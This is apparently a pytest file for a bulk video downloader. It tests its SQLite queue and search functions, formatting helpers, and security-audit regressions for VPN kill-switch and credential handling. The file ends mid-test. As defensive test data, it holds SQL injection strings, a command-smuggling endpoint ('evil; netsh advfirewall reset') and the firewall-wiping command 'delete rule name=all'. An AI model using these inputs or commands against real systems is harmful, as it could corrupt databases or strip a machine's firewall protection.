"""Phase 3 coverage-gap fills (audit 2026-05).

Targets functions identified by audit_phase3.py as high-complexity and
zero-coverage:

  db.queue_upsert          cx=14, loc=40  (hot-path, called every job change)
  db.queue_paginate        cx=5,  loc=11  (the queue UI's data source)
  db.db_search             cx=5,  loc=12  (logs/recent panel data source)
  detect.parse_size_bytes  cx=4,  loc=10  (file-size extraction from button text)
  detect.res_label         cx=13, loc=14  (pixel-height → human label)
  detect.fmt_bytes         cx=6,  loc=6   (mirrors JS fmtB)
  detect.safe_dest         cx=4,  loc=6   (collision-free destination filename)
  detect.disk_free_gb      cx=3,  loc=5   (parent-walk to find existing dir)

Cross-runner-portable: setup_method/teardown_method classes, no
@pytest.fixture, no monkeypatch builtin, no tmp_path builtin. Same
pattern as the v3.43.60 test refactors.
"""
from __future__ import annotations

# [SAST 3:13pm 13 may] removed unused: import os
import shutil
import tempfile
from pathlib import Path


# ─────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────

class _DbBase:
    """Mixin: redirect DB_PATH to a per-test tempfile, init the schema,
    restore on teardown. Avoids @pytest.fixture so the test runs under
    run_tests.py's minimal runner."""

    def setup_method(self, method=None):
        from bulk_downloader import db as _db
        self._db = _db
        self._tmpdir = tempfile.mkdtemp(prefix="bd_phase3_")
        self._orig_db_path = _db.DB_PATH
        _db.DB_PATH = str(Path(self._tmpdir) / "queue.db")
        _db.db_init()

    def teardown_method(self, method=None):
        self._db.DB_PATH = self._orig_db_path
        # Best-effort cleanup; on Windows a dangling WAL can hold the file
        try:
            shutil.rmtree(self._tmpdir, ignore_errors=True)
        except Exception:
            pass

    def _row(self, site_id, url):
        """Pull a single queue row as a dict; None if absent."""
        with self._db.db_conn() as cx:
            r = cx.execute(
                "SELECT * FROM queue WHERE site_id=? AND url=?",
                (site_id, url),
            ).fetchone()
            return dict(r) if r else None


# ─────────────────────────────────────────────────────────────────────
# db.queue_upsert
# ─────────────────────────────────────────────────────────────────────

class TestQueueUpsertInsert(_DbBase):

    def test_inserts_new_row_with_default_status_pending(self):
        self._db.queue_upsert("siteA", "https://example.com/v1")
        row = self._row("siteA", "https://example.com/v1")
        assert row is not None, "new row should be inserted"
        # Default status per the defaults dict in queue_upsert
        assert row["status"] == "pending"
        # Numeric defaults
        assert row["retries"] == 0
        assert row["retry_after"] == 0
        assert row["force_download"] == 0
        assert row["file_size"] == 0
        # String defaults
        assert row["message"] == ""
        assert row["screenshot"] == ""
        assert row["filename"] == ""

    def test_inserts_with_provided_status(self):
        self._db.queue_upsert("siteA", "https://example.com/v2", status="done",
                               filename="x.mp4", file_size=1024)
        row = self._row("siteA", "https://example.com/v2")
        assert row["status"] == "done"
        assert row["filename"] == "x.mp4"
        assert row["file_size"] == 1024

    def test_two_sites_can_have_same_url(self):
        self._db.queue_upsert("siteA", "https://shared/url", status="pending")
        self._db.queue_upsert("siteB", "https://shared/url", status="done")
        a = self._row("siteA", "https://shared/url")
        b = self._row("siteB", "https://shared/url")
        assert a["status"] == "pending"
        assert b["status"] == "done"


class TestQueueUpsertUpdate(_DbBase):

    def test_second_call_updates_existing_row(self):
        self._db.queue_upsert("siteA", "u1", status="pending")
        self._db.queue_upsert("siteA", "u1", status="running", message="dl 50%")
        row = self._row("siteA", "u1")
        assert row["status"] == "running"
        assert row["message"] == "dl 50%"

    def test_update_preserves_unchanged_fields(self):
        self._db.queue_upsert("siteA", "u1", status="pending", filename="f.mp4",
                               file_size=999)
        # Update status only; filename + size should remain
        self._db.queue_upsert("siteA", "u1", status="running")
        row = self._row("siteA", "u1")
        assert row["status"] == "running"
        assert row["filename"] == "f.mp4"
        assert row["file_size"] == 999

    def test_ts_updated_advances_on_each_call(self):
        import time
        self._db.queue_upsert("siteA", "u1", status="pending")
        ts1 = self._row("siteA", "u1")["ts_updated"]
        time.sleep(1.05)  # SQLite strftime is to second resolution
        self._db.queue_upsert("siteA", "u1", status="running")
        ts2 = self._row("siteA", "u1")["ts_updated"]
        assert ts2 > ts1, f"ts_updated should advance: {ts1!r} -> {ts2!r}"


class TestQueueUpsertWhitelistDefense(_DbBase):
    """Phase 41.7 hardening: queue_upsert drops unknown column names
    silently rather than letting them reach the f-string interpolation
    (where they would become SQL injection vectors). Verified via Phase 1
    audit (db.py:304 SQL f-string defended by _QUEUE_COLUMNS whitelist)."""

    def test_unknown_column_silently_dropped_on_insert(self):
        # `evil_col` is not in _QUEUE_COLUMNS — must be dropped.
        # A naive implementation would have raised sqlite3.OperationalError
        # ("no such column") or worse, allowed injection. The whitelist
        # drops the key before the SQL is built.
        self._db.queue_upsert("siteA", "u1",
                               status="pending",
                               evil_col="'); DROP TABLE queue; --")
        # If we got here without an exception, the defense worked.
        row = self._row("siteA", "u1")
        assert row is not None, "row should still be inserted (with valid cols)"
        assert row["status"] == "pending"
        # And the queue table should still exist:
        with self._db.db_conn() as cx:
            cx.execute("SELECT 1 FROM queue").fetchone()  # no exception = ok

    def test_unknown_column_silently_dropped_on_update(self):
        # Existing row first
        self._db.queue_upsert("siteA", "u1", status="pending")
        # Now try to update with a mix of valid + invalid columns
        self._db.queue_upsert("siteA", "u1",
                               status="done",
                               cookie=") OR 1=1; --")
        row = self._row("siteA", "u1")
        assert row["status"] == "done"

    def test_all_unknown_keys_drops_to_pure_default_insert(self):
        # If EVERY field is unknown, queue_upsert should still insert a
        # row with all defaults (status='pending').
        self._db.queue_upsert("siteA", "u1",
                               unknown1="x", unknown2="y", unknown3="z")
        row = self._row("siteA", "u1")
        assert row is not None
        assert row["status"] == "pending"


# ─────────────────────────────────────────────────────────────────────
# db.queue_paginate
# ─────────────────────────────────────────────────────────────────────

class TestQueuePaginate(_DbBase):

    def _seed(self):
        for i, status in enumerate(["pending"] * 5 + ["done"] * 3 + ["failed"] * 2):
            self._db.queue_upsert("siteA", f"https://ex.com/{i}", status=status,
                                   ord=i)
        # Extra row on different site to verify scoping
        self._db.queue_upsert("siteB", "https://ex.com/100", status="pending")

    def test_returns_only_requested_site(self):
        self._seed()
        rows = self._db.queue_paginate("siteA")
        assert all(r["site_id"] == "siteA" for r in rows)
        assert len(rows) == 10

    def test_status_filter_narrows_results(self):
        self._seed()
        rows = self._db.queue_paginate("siteA", status_filter="pending")
        assert len(rows) == 5
        assert all(r["status"] == "pending" for r in rows)

    def test_status_filter_all_returns_all(self):
        self._seed()
        rows = self._db.queue_paginate("siteA", status_filter="all")
        assert len(rows) == 10

    def test_search_filter_matches_url_substring(self):
        self._seed()
        # URLs are like https://ex.com/0, /1, /2... so '/0' matches both /0 and /10 etc
        rows = self._db.queue_paginate("siteA", search="/0")
        assert len(rows) >= 1
        for r in rows:
            assert "/0" in r["url"]

    def test_limit_caps_result_count(self):
        self._seed()
        rows = self._db.queue_paginate("siteA", limit=3)
        assert len(rows) == 3

    def test_offset_skips_rows(self):
        self._seed()
        first_page = self._db.queue_paginate("siteA", limit=5, offset=0)
        second_page = self._db.queue_paginate("siteA", limit=5, offset=5)
        # No overlap by URL
        first_urls = {r["url"] for r in first_page}
        second_urls = {r["url"] for r in second_page}
        assert not (first_urls & second_urls), "pagination overlapped"

    def test_unknown_site_returns_empty(self):
        self._seed()
        rows = self._db.queue_paginate("nonexistent")
        assert rows == []


# ─────────────────────────────────────────────────────────────────────
# db.db_search
# ─────────────────────────────────────────────────────────────────────

class TestDbSearch(_DbBase):

    def _seed_history(self):
        with self._db.db_conn() as cx:
            for i in range(5):
                cx.execute(
                    "INSERT INTO history(site_id, url, filename, message, status, "
                    "site_name, ts) VALUES (?, ?, ?, ?, ?, ?, datetime('now'))",
                    (f"site{i % 2}", f"https://ex.com/{i}",
                     f"video_{i}.mp4", f"msg {i}",
                     "done" if i % 2 == 0 else "failed",
                     f"Site {i % 2}"),
                )

    def test_no_filter_returns_all(self):
        self._seed_history()
        rows = self._db.db_search()
        assert len(rows) == 5

    def test_site_id_filter(self):
        self._seed_history()
        rows = self._db.db_search(site_id="site0")
        assert len(rows) == 3
        assert all(r["site_id"] == "site0" for r in rows)

    def test_status_filter(self):
        self._seed_history()
        rows = self._db.db_search(status="done")
        assert all(r["status"] == "done" for r in rows)

    def test_query_filter_matches_url(self):
        self._seed_history()
        rows = self._db.db_search(query="ex.com/2")
        assert len(rows) >= 1
        assert any("/2" in r["url"] for r in rows)

    def test_query_filter_matches_filename(self):
        self._seed_history()
        rows = self._db.db_search(query="video_3")
        assert len(rows) == 1
        assert "video_3" in rows[0]["filename"]

    def test_limit_caps_results(self):
        self._seed_history()
        rows = self._db.db_search(limit=2)
        assert len(rows) == 2

    def test_combined_filters(self):
        self._seed_history()
        rows = self._db.db_search(site_id="site0", status="done", query="ex.com")
        for r in rows:
            assert r["site_id"] == "site0"
            assert r["status"] == "done"
            assert "ex.com" in r["url"]


# ─────────────────────────────────────────────────────────────────────
# db.db_find_filename_duplicate  (+ v3.42.0 LIKE-escape audit fix regression)
# ─────────────────────────────────────────────────────────────────────

class TestDbFindFilenameDuplicate(_DbBase):

    def _add_history(self, site_id, filename, status="done", file_size=0):
        with self._db.db_conn() as cx:
            cx.execute(
                "INSERT INTO history(site_id, url, filename, file_size, status, "
                "site_name, ts) VALUES (?, ?, ?, ?, ?, ?, datetime('now'))",
                (site_id, f"https://ex.com/{filename}", filename, file_size,
                 status, site_id),
            )

    def test_returns_none_for_empty_filename(self):
        assert self._db.db_find_filename_duplicate("") is None
        assert self._db.db_find_filename_duplicate(None) is None

    def test_finds_simple_duplicate(self):
        self._add_history("siteA", "video.mp4")
        row = self._db.db_find_filename_duplicate("video.mp4")
        assert row is not None
        assert row["site_id"] == "siteA"
        assert row["filename"] == "video.mp4"

    def test_basename_only_matching(self):
        # Caller may pass a full path; only the basename should match.
        self._add_history("siteA", "video.mp4")
        row = self._db.db_find_filename_duplicate("/downloads/sub/video.mp4")
        assert row is not None
        assert row["filename"] == "video.mp4"

    def test_case_insensitive_matching(self):
        self._add_history("siteA", "Video.MP4")
        row = self._db.db_find_filename_duplicate("video.mp4")
        assert row is not None

    def test_only_done_status_matches(self):
        # A failed/pending row should not count as a duplicate
        self._add_history("siteA", "video.mp4", status="failed")
        assert self._db.db_find_filename_duplicate("video.mp4") is None

    def test_exclude_site_filter(self):
        self._add_history("siteA", "video.mp4")
        # When excluding the site that has it, no match
        row = self._db.db_find_filename_duplicate("video.mp4", exclude_site="siteA")
        assert row is None
        # When excluding a different site, match
        row = self._db.db_find_filename_duplicate("video.mp4", exclude_site="siteB")
        assert row is not None

    def test_size_tolerance_within_5pct_matches(self):
        self._add_history("siteA", "video.mp4", file_size=100_000_000)
        # 99 MB vs 100 MB = 1% diff → match
        row = self._db.db_find_filename_duplicate("video.mp4", file_size=99_000_000)
        assert row is not None

    def test_size_tolerance_over_5pct_no_match(self):
        self._add_history("siteA", "video.mp4", file_size=100_000_000)
        # 50 MB vs 100 MB = 50% diff → no match
        row = self._db.db_find_filename_duplicate("video.mp4", file_size=50_000_000)
        assert row is None

    # ── v3.42.0 audit-fix regression tests: LIKE-wildcard escape ────

    def test_underscore_in_filename_does_not_match_unrelated_basename(self):
        """v3.42.0 audit: a filename starting with '_' must NOT match
        unrelated basenames via the LIKE pattern. Pre-fix, `_movie.mp4`
        would match `xmovie.mp4` because `_` is LIKE's single-char
        wildcard. The fix escapes underscores with backslash + ESCAPE
        clause."""
        self._add_history("siteA", "xmovie.mp4")
        # Searching for _movie.mp4 must NOT match xmovie.mp4
        row = self._db.db_find_filename_duplicate("_movie.mp4")
        assert row is None, \
            "underscore in search query matched unrelated basename — " \
            "the v3.42.0 LIKE-escape audit fix has regressed"

    def test_percent_in_filename_does_not_match_unrelated_basename(self):
        """Same regression class as above but for the `%` wildcard.
        `%foo.mp4` would have matched ANY filename ending in `foo.mp4`
        before the escape fix."""
        self._add_history("siteA", "unrelated.mp4")
        # `%foo.mp4` should not match because no row has literal "%foo.mp4"
        row = self._db.db_find_filename_duplicate("%foo.mp4")
        assert row is None, \
            "percent wildcard in search matched unrelated row — " \
            "v3.42.0 LIKE-escape audit fix has regressed"

    def test_literal_underscore_basename_still_matches_itself(self):
        # Defense-in-depth: the escape must still allow exact matches.
        self._add_history("siteA", "_intro.mp4")
        row = self._db.db_find_filename_duplicate("_intro.mp4")
        assert row is not None
        assert row["filename"] == "_intro.mp4"


# ─────────────────────────────────────────────────────────────────────
# db.db_hourly_success_rate  (+ v3.42.0 localtime audit fix verification)
# ─────────────────────────────────────────────────────────────────────

class TestDbHourlySuccessRate(_DbBase):

    def _seed_at_hour(self, site_id, hour, status):
        """Insert a history row tagged with a specific hour-of-day.
        SQLite strftime('%H', ts, 'localtime') gives 0-23."""
        # Use a fixed date so we don't span midnight in this test;
        # 2024-06-15 chosen arbitrarily.
        ts = f"2024-06-15 {hour:02d}:30:00"
        with self._db.db_conn() as cx:
            cx.execute(
                "INSERT INTO history(site_id, url, filename, status, "
                "site_name, ts) VALUES (?, ?, ?, ?, ?, ?)",
                (site_id, f"https://ex.com/{hour}-{status}",
                 f"f_{hour}_{status}.mp4", status, site_id, ts),
            )

    def test_returns_24_buckets(self):
        rows = self._db.db_hourly_success_rate(since_days=10000)
        assert len(rows) == 24
        hours = [r["hour"] for r in rows]
        assert hours == list(range(24))

    def test_empty_history_returns_all_zero_buckets_with_rate_none(self):
        rows = self._db.db_hourly_success_rate(since_days=10000)
        for r in rows:
            assert r["total"] == 0
            assert r["done"] == 0
            assert r["failed"] == 0
            assert r["rate"] is None, \
                f"empty bucket should have rate=None, got {r['rate']!r}"

    def test_success_rate_computed_correctly(self):
        # 8 done + 2 failed at hour 14 → rate = 0.8
        # Note: timestamps in DB are UTC; strftime localtime applies the
        # system tz. Tests run in UTC by default in the container, so
        # hour=14 in UTC = hour=14 in localtime. If the runner's TZ
        # differs, the bucket index would shift; we sum all buckets to
        # confirm the math regardless of where they land.
        for _ in range(8):
            self._seed_at_hour("siteA", 14, "done")
        for _ in range(2):
            self._seed_at_hour("siteA", 14, "failed")
        rows = self._db.db_hourly_success_rate(since_days=10000)
        # Find the non-empty bucket (depends on system TZ — but only one bucket
        # should have data since all inserts are at the same hour)
        nonempty = [r for r in rows if r["total"] > 0]
        assert len(nonempty) == 1, f"expected 1 non-empty bucket, got {len(nonempty)}"
        b = nonempty[0]
        assert b["total"] == 10
        assert b["done"] == 8
        assert b["failed"] == 2
        assert abs(b["rate"] - 0.8) < 0.001

    def test_site_id_filter(self):
        for _ in range(5):
            self._seed_at_hour("siteA", 10, "done")
        for _ in range(5):
            self._seed_at_hour("siteB", 10, "done")
        rows = self._db.db_hourly_success_rate(site_id="siteA",
                                                since_days=10000)
        total = sum(r["total"] for r in rows)
        assert total == 5, f"expected only siteA's 5 rows, got total={total}"

    def test_since_days_excludes_older_rows(self):
        # Old row outside the window
        with self._db.db_conn() as cx:
            cx.execute(
                "INSERT INTO history(site_id, url, filename, status, "
                "site_name, ts) VALUES (?, ?, ?, ?, ?, datetime('now', '-60 days'))",
                ("siteA", "https://ex.com/old", "old.mp4", "done", "siteA"),
            )
        # 30-day window should exclude it
        rows = self._db.db_hourly_success_rate(since_days=30)
        total = sum(r["total"] for r in rows)
        assert total == 0, f"60-day-old row leaked into 30-day window: total={total}"


class TestParseSizeBytes:
    """Each variant matters because it's the resolution tiebreaker:
    same pixel height, bigger file ≈ better encode."""

    def test_returns_zero_for_empty(self):
        from bulk_downloader.detect import parse_size_bytes
        assert parse_size_bytes("") == 0
        assert parse_size_bytes(None) == 0

    def test_returns_zero_when_no_size_pattern(self):
        from bulk_downloader.detect import parse_size_bytes
        assert parse_size_bytes("Download 1080p") == 0
        assert parse_size_bytes("just some text") == 0

    def test_kb(self):
        from bulk_downloader.detect import parse_size_bytes
        assert parse_size_bytes("500 KB") == 500 * 1024
        assert parse_size_bytes("500KB") == 500 * 1024

    def test_mb(self):
        from bulk_downloader.detect import parse_size_bytes
        assert parse_size_bytes("447.26MB") == int(447.26 * 1024 * 1024)
        assert parse_size_bytes("100 MB") == 100 * 1024 * 1024

    def test_gb(self):
        from bulk_downloader.detect import parse_size_bytes
        assert parse_size_bytes("5 GB") == 5 * 1024**3
        assert parse_size_bytes("5.5GB") == int(5.5 * 1024**3)

    def test_tb(self):
        from bulk_downloader.detect import parse_size_bytes
        assert parse_size_bytes("1 TB") == 1024**4

    def test_size_in_parens_in_full_button_text(self):
        from bulk_downloader.detect import parse_size_bytes
        # Real-world button text from wowgirls etc.
        assert parse_size_bytes("Download 4K (5.43 GB)") == int(5.43 * 1024**3)
        assert parse_size_bytes("1080p (447 MB)") == 447 * 1024 * 1024


# ─────────────────────────────────────────────────────────────────────
# detect.res_label
# ─────────────────────────────────────────────────────────────────────

class TestResLabel:
    """Each tier in heuristic_scoring.RESOLUTION_TIERS needs a label.
    These are user-visible (badges in the UI). Project doc lists every
    tier; this is one of the two parallel resolution tables that must
    stay in sync."""

    def test_zero_is_auto(self):
        from bulk_downloader.detect import res_label
        assert res_label(0) == "auto"

    def test_240p_through_4k_get_named_labels(self):
        from bulk_downloader.detect import res_label
        cases = [
            (240, "240p"), (360, "360p"), (480, "480p"),
            (540, "540p"), (720, "720p"), (1080, "1080p"),
            (1440, "1440p"), (2160, "4K"), (2880, "5K"),
            (3160, "6K"), (4320, "8K"),
        ]
        for score, expected in cases:
            assert res_label(score) == expected, \
                f"res_label({score}) = {res_label(score)!r}, expected {expected!r}"

    def test_unknown_low_score_uses_pixel_height_format(self):
        from bulk_downloader.detect import res_label
        # 100p exists historically; isn't in the named tiers; falls through
        # to the "f{score}p" branch
        assert res_label(100) == "100p"

    def test_higher_than_8k_still_returns_8k(self):
        from bulk_downloader.detect import res_label
        # Future-proofing: anything >=4320 reports as 8K
        assert res_label(5000) == "8K"
        assert res_label(99999) == "8K"

    def test_in_between_picks_lower_tier(self):
        from bulk_downloader.detect import res_label
        # 700 is below the 720p threshold; should hit 540p
        assert res_label(700) == "540p"
        # 2150 is below 4K threshold; should hit 1440p
        assert res_label(2150) == "1440p"


# ─────────────────────────────────────────────────────────────────────
# detect.fmt_bytes
# ─────────────────────────────────────────────────────────────────────

class TestFmtBytes:

    def test_zero_and_none_return_empty(self):
        from bulk_downloader.detect import fmt_bytes
        assert fmt_bytes(0) == ""
        assert fmt_bytes(None) == ""
        assert fmt_bytes(-5) == ""

    def test_bytes_under_1k(self):
        from bulk_downloader.detect import fmt_bytes
        assert fmt_bytes(500) == "500 B"
        # Boundary: source uses strict `b>1024`, so 1024 itself falls
        # into the bytes branch.
        assert fmt_bytes(1024) == "1024 B"
        # First value to cross into KB:
        assert fmt_bytes(1025) == "1 KB"

    def test_kb_range(self):
        from bulk_downloader.detect import fmt_bytes
        assert fmt_bytes(2000) == "1 KB"   # 2000/1024 = 1
        assert fmt_bytes(100_000) == "97 KB"

    def test_mb_range(self):
        from bulk_downloader.detect import fmt_bytes
        # 5 MB
        assert fmt_bytes(5 * 1024 * 1024) == "5.0 MB"

    def test_gb_range(self):
        from bulk_downloader.detect import fmt_bytes
        # 5.5 GB
        assert fmt_bytes(int(5.5 * 1024**3)) == "5.5 GB"


# ─────────────────────────────────────────────────────────────────────
# detect.safe_dest
# ─────────────────────────────────────────────────────────────────────

class TestSafeDest:
    """Suffix-numbering algorithm to avoid clobbering existing files."""

    def setup_method(self, method=None):
        self._td = tempfile.mkdtemp(prefix="bd_safedest_")

    def teardown_method(self, method=None):
        shutil.rmtree(self._td, ignore_errors=True)

    def test_nonexistent_path_returned_unchanged(self):
        from bulk_downloader.detect import safe_dest
        p = Path(self._td) / "file.mp4"
        assert safe_dest(p) == p

    def test_existing_gets_suffix_1(self):
        from bulk_downloader.detect import safe_dest
        p = Path(self._td) / "file.mp4"
        p.write_text("first")
        result = safe_dest(p)
        assert result.name == "file_1.mp4"
        assert not result.exists()

    def test_multiple_existing_advance_suffix(self):
        from bulk_downloader.detect import safe_dest
        p = Path(self._td) / "f.mp4"
        for nm in ("f.mp4", "f_1.mp4", "f_2.mp4"):
            (Path(self._td) / nm).write_text("x")
        result = safe_dest(p)
        assert result.name == "f_3.mp4"

    def test_extension_preserved(self):
        from bulk_downloader.detect import safe_dest
        p = Path(self._td) / "vid.mkv"
        p.write_text("x")
        assert safe_dest(p).suffix == ".mkv"


# ─────────────────────────────────────────────────────────────────────
# detect.disk_free_gb
# ─────────────────────────────────────────────────────────────────────

class TestDiskFreeGb:

    def test_returns_positive_number_for_real_path(self):
        from bulk_downloader.detect import disk_free_gb
        free = disk_free_gb(tempfile.gettempdir())
        assert isinstance(free, float)
        assert free > 0

    def test_walks_up_to_existing_parent(self):
        # path doesn't exist; should walk up the parents until one does
        from bulk_downloader.detect import disk_free_gb
        deep = "/tmp/no/such/path/that/exists/here"
        free = disk_free_gb(deep)
        # Should return something (the /tmp parent exists)
        assert free is None or free > 0

    def test_returns_none_on_error(self):
        # Forcing a True failure is hard without monkeypatching shutil.
        # The function catches Exception broadly. Passing something that
        # Path() can't coerce demonstrates the error path.
        from bulk_downloader.detect import disk_free_gb
        # An int isn't a valid path; Path() coerces it but stat will fail.
        # Either way the broad except returns None — verify the contract.
        result = disk_free_gb(None)
        assert result is None or result > 0  # empty/None branches to Path.home()


# ─────────────────────────────────────────────────────────────────────
# Phase 4 fuzzing regression locks
# ─────────────────────────────────────────────────────────────────────

class TestPhase4FuzzingRegressions:
    """Lock in the defensive-input fixes from Phase 4 fuzzing. If these
    fail, someone reverted the audit-2026-05 type checks."""

    def test_resolve_password_non_string_returns_none(self):
        from bulk_downloader.secrets_store import resolve_password
        # Phase 4 found: int/list/dict input crashed with .startswith
        # AttributeError. The fix returns None for any non-string non-None.
        assert resolve_password(42) is None
        assert resolve_password([1, 2, 3]) is None
        assert resolve_password({"key": "val"}) is None
        assert resolve_password(True) is None  # bool is also not str

    def test_resolve_password_string_inputs_still_work(self):
        from bulk_downloader.secrets_store import resolve_password
        # Defense must not regress the happy path
        assert resolve_password(None) is None
        assert resolve_password("") is None
        assert resolve_password("plaintext-pw") == "plaintext-pw"

    def test_add_subscription_rejects_non_string_keys(self):
        from bulk_downloader import push
        # Phase 4 found: keys.p256dh = [1,2,3] crashed SQLite with
        # ProgrammingError because list can't bind to a TEXT column.
        # The fix validates types and returns False instead.
        bad_subs = [
            {"endpoint": "https://push.example.com/x",
             "keys": {"p256dh": [1, 2, 3], "auth": "y"}},
            {"endpoint": "https://push.example.com/x",
             "keys": {"p256dh": "x", "auth": 42}},
            {"endpoint": 123,
             "keys": {"p256dh": "x", "auth": "y"}},
            {"endpoint": "https://push.example.com/x",
             "keys": "not-a-dict"},
            "not-a-dict-at-all",
            None,
            [1, 2, 3],
        ]
        # Should return False for each (no exception, no SQLite call)
        for sub in bad_subs:
            assert push.add_subscription(sub) is False, \
                f"expected False for malformed sub: {sub!r}"


# ─────────────────────────────────────────────────────────────────────
# Phase 5 manual-audit regression locks
# ─────────────────────────────────────────────────────────────────────

class TestPhase5KillSwitchSystem:
    """Lock in the Phase 5 audit findings for vpn_kill_switch_system.

    CRITICAL: revert_all() previously contained a netsh command
    `delete rule name=all program=any` with a comment claiming it was
    a "no-op safe call". In reality, `name=all` is a documented netsh
    wildcard that deletes ALL Windows Firewall rules. The atexit hook
    would fire this on every clean shutdown after the user opened the
    VPN UI panel — wiping the user's firewall configuration.
    """

    def test_revert_all_does_not_contain_wildcard_delete(self):
        """The source must not contain the dangerous 'delete rule
        name=all' wildcard. If someone re-adds it, this test fails."""
        from pathlib import Path
        src = Path(__file__).parent.parent / "bulk_downloader" / "vpn_kill_switch_system.py"
        text = src.read_text(encoding="utf-8")
        # Look for the literal command. Anywhere it appears outside a
        # docstring/comment that documents the historical bug is a regression.
        bad = "delete rule name=all"
        # Allow it only inside the audit-fix comment block (which explains
        # why we removed it). Crude check: every occurrence must follow
        # the word "wrong" or "WRONG" somewhere in the preceding 800 chars.
        idx = 0
        while True:
            i = text.find(bad, idx)
            if i < 0:
                break
            preceding = text[max(0, i - 800):i]
            if "wrong" not in preceding.lower() and "FIX" not in preceding:
                raise AssertionError(
                    f"vpn_kill_switch_system.py contains 'delete rule "
                    f"name=all' outside the audit-fix documentation at "
                    f"offset {i}. This wildcard deletes ALL Windows "
                    f"Firewall rules — see Phase 5 audit notes."
                )
            idx = i + len(bad)

    def test_build_commands_rejects_endpoint_with_shell_metachars(self):
        """vpn_endpoint goes raw into f-string interpolation; characters
        outside hostname alphabet must be rejected before they reach netsh."""
        from bulk_downloader.vpn_kill_switch_system import _build_commands, DEFAULT_ALLOWLIST
        bad_endpoints = [
            'evil; netsh advfirewall reset',
            'a b c',           # spaces
            'host"value',      # quote
            'host`cmd`',
            'host$var',
            'host\nnewline',
            '',                # empty
            '   ',             # whitespace only
        ]
        for ep in bad_endpoints:
            try:
                _build_commands("test", ep, DEFAULT_ALLOWLIST)
                raise AssertionError(f"expected ValueError for {ep!r}")
            except ValueError:
                pass  # expected

    def test_build_commands_accepts_normal_endpoints(self):
        """Defense must not break legitimate use."""
        from bulk_downloader.vpn_kill_switch_system import _build_commands, DEFAULT_ALLOWLIST
        # IPv4 with port
        cmds = _build_commands("t1", "1.2.3.4:51820", DEFAULT_ALLOWLIST)
        assert len(cmds) > 0
        # IPv4 only
        cmds = _build_commands("t1", "1.2.3.4", DEFAULT_ALLOWLIST)
        assert len(cmds) > 0
        # Hostname
        cmds = _build_commands("t1", "wg.example.com:51820", DEFAULT_ALLOWLIST)
        assert len(cmds) > 0
        # IPv6 (colons are allowed in hostname charset)
        cmds = _build_commands("t1", "2001:db8::1", DEFAULT_ALLOWLIST)
        assert len(cmds) > 0

    def test_build_commands_rejects_bad_port(self):
        """Port must be int 1..65535 — defense against config corruption."""
        from bulk_downloader.vpn_kill_switch_system import _build_commands
        try:
            _build_commands("t1", "1.2.3.4", {"x": ("not-an-int", "tcp")})
            raise AssertionError("expected ValueError for non-int port")
        except ValueError:
            pass
        try:
            _build_commands("t1", "1.2.3.4", {"x": (0, "tcp")})
            raise AssertionError("expected ValueError for port=0")
        except ValueError:
            pass
        try:
            _build_commands("t1", "1.2.3.4", {"x": (99999, "tcp")})
            raise AssertionError("expected ValueError for port>65535")
        except ValueError:
            pass

    def test_build_commands_rejects_bad_proto(self):
        """Proto must be tcp/udp/any."""
        from bulk_downloader.vpn_kill_switch_system import _build_commands
        try:
            _build_commands("t1", "1.2.3.4", {"x": (80, "evil")})
            raise AssertionError("expected ValueError for bad proto")
        except ValueError:
            pass


class TestPhase5VpnCredentialResolution:
    """Phase 5 critical bug: VPN backends were reading tunnel.config['password']
    and tunnel.config['private_key'] directly without resolving @cred:* refs
    through the secrets vault. With the encrypted vault active, this meant
    the literal string '@cred:tun-abc:password' was being written to the
    OpenVPN auth file / WireGuard .conf and sent to the VPN server — every
    VPN connection failed authentication.
    """

    def test_openvpn_start_calls_resolve_secrets(self):
        """Static check: vpn_openvpn.py's start() calls resolve_secrets
        before reading from cfg."""
        from pathlib import Path
        src = (Path(__file__).parent.parent / "bulk_downloader"
                / "vpn_openvpn.py").read_text(encoding="utf-8")
        # The resolution must happen BEFORE the cfg.get("ovpn") read
        # since the .ovpn text itself might also embed credentials.
        start_idx = src.find("def start(tunnel:")
        ovpn_read_idx = src.find('cfg.get("ovpn"', start_idx)
        resolve_idx = src.find("resolve_secrets", start_idx)
        assert start_idx > 0 and resolve_idx > 0 and ovpn_read_idx > 0
        assert resolve_idx < ovpn_read_idx, (
            "resolve_secrets must run before reading credentials from cfg "
            "in vpn_openvpn.start() — otherwise '@cred:*' refs hit the disk"
        )

    def test_wireguard_start_calls_resolve_secrets(self):
        """Static check: vpn_wireguard.py's start() calls resolve_secrets
        before rendering the .conf."""
        from pathlib import Path
        src = (Path(__file__).parent.parent / "bulk_downloader"
                / "vpn_wireguard.py").read_text(encoding="utf-8")
        start_idx = src.find("def start(tunnel:")
        render_idx = src.find("render_conf(cfg)", start_idx)
        resolve_idx = src.find("resolve_secrets", start_idx)
        assert start_idx > 0 and resolve_idx > 0 and render_idx > 0
        assert resolve_idx < render_idx, (
            "resolve_secrets must run before render_conf(cfg) in "
            "vpn_wireguard.start() — otherwise '@cred:*' refs become "
            "literal text in the .conf"
        )

    def test_resolve_secrets_replaces_cred_refs(self):
        """Functional check: resolve_secrets actually substitutes the
        backend value. Uses a fake secrets backend so we don't depend
        on the vault state."""
        from bulk_downloader import vpn_config, secrets_store

        class FakeBackend:
            def get(self, key):
                return {"tun-abc:password": "real-pw",
                         "tun-abc:private_key": "ZmFrZQ=="}.get(key)

        orig = secrets_store.get_backend
        secrets_store.get_backend = lambda: FakeBackend()
        try:
            cfg = {
                "ovpn": "literal-ovpn-text",
                "password": "@cred:tun-abc:password",
                "private_key": "@cred:tun-abc:private_key",
                "extra": {"nested_pw": "@cred:tun-abc:password"},
            }
            resolved = vpn_config.resolve_secrets(cfg)
            assert resolved["password"] == "real-pw"
            assert resolved["private_key"] == "ZmFrZQ=="
            assert resolved["extra"]["nested_pw"] == "real-pw"
            # Non-cred values unchanged
            assert resolved["ovpn"] == "literal-ovpn-text"
        finally:
            secrets_store.get_backend = orig


class TestPhase5LeakTestsWebRtcParsing:
    """Locks in Phase 5 audit fix: WEBRTC_PROBE_JS used to scan the entire
    SDP with a hex+colon regex that matched the DTLS fingerprint and the
    `c=IN IP4 0.0.0.0` placeholder. Those false positives would mark a
    completely healthy tunnel as leaking and immediately trip the kill
    switch on the first probe.

    These tests reach into the JS string and re-run the parsing logic in
    Python to confirm the new candidate-line-only parser is used and that
    fingerprints / placeholders no longer slip through. We don't need a
    full JS engine: the tests verify (a) the legacy raw-regex scan over
    the SDP is gone and (b) the parser is anchored on `a=candidate:`.
    """

    def test_webrtc_js_no_longer_matches_fingerprint(self):
        from bulk_downloader import vpn_leak_tests
